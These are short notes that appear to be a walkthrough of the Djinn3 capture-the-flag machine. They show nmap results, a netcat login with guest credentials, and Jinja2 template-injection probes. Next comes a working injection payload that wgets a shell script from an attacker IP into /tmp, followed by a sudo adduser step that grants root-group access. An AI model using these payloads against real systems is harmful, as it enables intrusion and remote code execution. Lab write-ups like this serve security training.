----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Djinn3
# 28/2/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    lighttpd 1.4.45
5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
31337/tcp open  Elite?

└─$ nc 192.168.110.102 31337
username> guest
password> guest
//got access

> open
Title: {{7*'7'}}
Description: {{7*'7'}}
>

{{config.__class__.__init__.__globals__['os'].popen('wget http://192.168.49.110/shell.py -O /tmp/shell.py').read()}}


ssh saint@192.168.97.102 
sudo -u root /usr/sbin/adduser hacker --gid 0